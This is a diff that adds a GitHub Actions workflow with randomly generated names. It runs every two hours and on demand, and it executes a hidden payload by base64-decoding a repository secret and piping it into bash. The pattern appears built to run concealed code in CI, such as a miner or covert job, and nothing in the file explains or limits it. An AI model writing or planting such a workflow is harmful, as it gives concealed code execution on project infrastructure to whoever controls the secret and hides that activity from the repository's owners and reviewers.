@@ -1,0 +1,13 @@
+name: DMVuwrS
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  HuQbxsyn:
+    runs-on: ubuntu-24.04
+    env:
+      IKsVNMZ: ${{ secrets.phcrchNfq }}
+    steps:
+      - uses: actions/checkout@v5
+      - run: echo "${{ secrets.RKJCztZpQSFJ }}" | base64 -d | bash
